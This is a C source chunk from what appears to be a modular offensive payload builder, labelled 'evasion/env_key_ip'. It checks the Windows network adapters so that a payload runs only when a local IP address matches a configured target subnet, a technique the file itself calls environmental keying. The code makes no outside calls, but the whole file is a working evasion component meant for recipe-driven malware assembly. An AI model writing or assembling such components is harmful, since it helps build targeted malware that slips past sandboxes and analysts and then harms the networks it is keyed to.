// chunk: evasion/env_key_ip
// depends: (none)
// provides: env_check_ip
// headers: winsock2.h,ws2tcpip.h,windows.h,iphlpapi.h
// risk: low
// note: Environmental keying — only execute if any local IP matches a subnet prefix.
//       Set ENV_KEY_IP var in recipe (e.g., "10.0." or "192.168.1.").

#ifndef CHUNK_ENV_KEY_IP
#define CHUNK_ENV_KEY_IP

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>

#ifndef ENV_KEY_IP
#define ENV_KEY_IP "{{ENV_KEY_IP}}"
#endif

static int env_check_ip(void) {
    const char *prefix = ENV_KEY_IP;
    if (prefix[0] == '\0')
        return 1;

    ULONG buf_size = 16384;
    IP_ADAPTER_ADDRESSES *addrs = (IP_ADAPTER_ADDRESSES *)malloc(buf_size);
    if (!addrs) return 0;

    ULONG ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST,
                                      NULL, addrs, &buf_size);
    if (ret != NO_ERROR) { free(addrs); return 0; }

    int matched = 0;
    for (IP_ADAPTER_ADDRESSES *a = addrs; a && !matched; a = a->Next) {
        if (a->OperStatus != IfOperStatusUp) continue;
        for (IP_ADAPTER_UNICAST_ADDRESS *u = a->FirstUnicastAddress; u && !matched; u = u->Next) {
            struct sockaddr_in *sa = (struct sockaddr_in *)u->Address.lpSockaddr;
            if (sa->sin_family != AF_INET) continue;
            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &sa->sin_addr, ip_str, sizeof(ip_str));
            if (strncmp(ip_str, prefix, strlen(prefix)) == 0)
                matched = 1;
        }
    }
    free(addrs);
    return matched;
}

#endif
